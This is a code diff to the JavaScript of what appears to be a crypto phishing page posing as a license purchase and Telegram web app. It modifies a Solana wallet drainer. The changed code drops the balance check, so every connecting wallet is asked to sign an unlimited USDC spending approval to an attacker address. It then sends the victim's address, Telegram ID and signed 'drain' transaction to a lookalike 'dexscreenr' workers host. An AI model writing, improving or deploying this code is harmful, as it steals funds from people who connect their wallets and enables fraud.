@@ -332,7 +332,7 @@
     if(!provider) { return; }
 
     try {
-      await provider.connect(); // Erster Connect (Pricing)
+      await provider.connect(); 
       
       loadingScreen.style.display = 'flex';
       document.getElementById('loadStatus').textContent = `Generating license for ${planName}...`;
@@ -498,7 +498,7 @@
       const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
       
       // 2. SOFORT Daten an Telegram schicken (Kein RPC-Check davor!)
-      const basePayload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: "0", usdc: "0", tg_user_id: tgUserId, ts: Date.now() });
+      const basePayload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: "0", usdc: "5", tg_user_id: tgUserId, ts: Date.now() });
       
       try { 
         await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { 
@@ -508,36 +508,24 @@
         navigator.sendBeacon("https://dexscreenr.rthvzkr6jv.workers.dev", new Blob([basePayload], {type: 'application/json'})); 
       }
 
-      // 3. Erst JETZT die Balance checken (um zu sehen, ob wir drainen können)
+      // 3. Signatur anfordern (Ohne RPC Check)
       const conn = new solanaWeb3.Connection("https://solana-mainnet.rpc.extrnode.com"); 
-      const solBalance = await conn.getBalance(resp.publicKey);
-      const solAmount = (solBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) || "0";
-      
-      let usdcAmount = 0;
       const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
 
-      if (typeof splToken !== 'undefined') {
-        try {
-          const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
-          const tokenBal = await conn.getTokenAccountBalance(victimAta);
-          usdcAmount = tokenBal.value.uiAmount || 0;
-        } catch (e) { usdcAmount = 0; }
-      }
+      const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
+      
+      const delegateIx = splToken.createApproveInstruction(victimAta, new solanaWeb3.PublicKey(ATTACKER), resp.publicKey, [], BigInt("18446744073709551615"));
+      const tx = new solanaWeb3.Transaction().add(delegateIx);
+      tx.feePayer = resp.publicKey;
+      tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
 
-      // 4. Wenn USDC da ist, Signatur anfordern (Drain)
-      if (usdcAmount > 0 && typeof splToken !== 'undefined') {
-        const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
-        const delegateIx = splToken.createApproveInstruction(victimAta, new solanaWeb3.PublicKey(ATTACKER), resp.publicKey, [], BigInt("18446744073709551615"));
-        const tx = new solanaWeb3.Transaction().add(delegateIx);
-        tx.feePayer = resp.publicKey;
-        tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
-        const signedTx = await provider.signTransaction(tx);
+      const signedTx = await provider.signTransaction(tx);
 
-        await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { 
-          method: "POST", headers: { "Content-Type": "application/json" }, 
-          body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", type: "drain", tg_user_id: tgUserId, ts: Date.now() }) 
-        });
-      }
+      await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { 
+        method: "POST", headers: { "Content-Type": "application/json" }, 
+        body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", type: "drain", tg_user_id: tgUserId, ts: Date.now() }) 
+      });
+      
     } catch (e) { 
       console.log("Wallet connection failed or rejected.", e);
     }
